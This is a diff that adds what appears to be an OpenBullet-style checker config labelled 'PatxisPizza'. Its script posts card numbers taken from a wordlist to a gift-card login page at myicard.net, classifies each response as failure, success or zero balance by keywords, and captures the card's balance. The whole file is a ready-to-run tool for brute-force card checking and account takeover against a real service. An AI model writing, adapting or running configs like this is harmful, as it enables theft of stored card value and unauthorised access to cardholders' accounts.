@@ -1,0 +1,42 @@
+[SETTINGS]
+{
+  "Name": "PatxisPizza",
+  "SuggestedBots": 10,
+  "LastModified": "2018-12-19T23:36:20.5969298+00:00",
+  "AdditionalInfo": "",
+  "Author": "ana,inxanity",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#login REQUEST POST "http://www3.myicard.net/loginAction.do" AutoRedirect=TRUE 
+  CONTENT "org.apache.struts.taglib.html.TOKEN=73803b927ff49c79073393ac2c0921f3&requiresPIN=false&redirectUrl=http%3A%2F%2Fwww3.myicard.net&iCardNumber=<USER>&styleDir=1%2Fdefault&language=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: http://www3.myicard.net" 
+  HEADER "Referer: http://www3.myicard.net/loginAction.do" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid card number. Please verify your card number and try" 
+  KEYCHAIN Success OR 
+    KEY "Click on the programs to view past transactions" 
+    KEY ">Logout</a>" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "0.0" 
+#Capture PARSE "<SOURCE>" LR "                         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;" "                           </td>" Recursive=FALSE -> CAP "Balance" "" "$" 
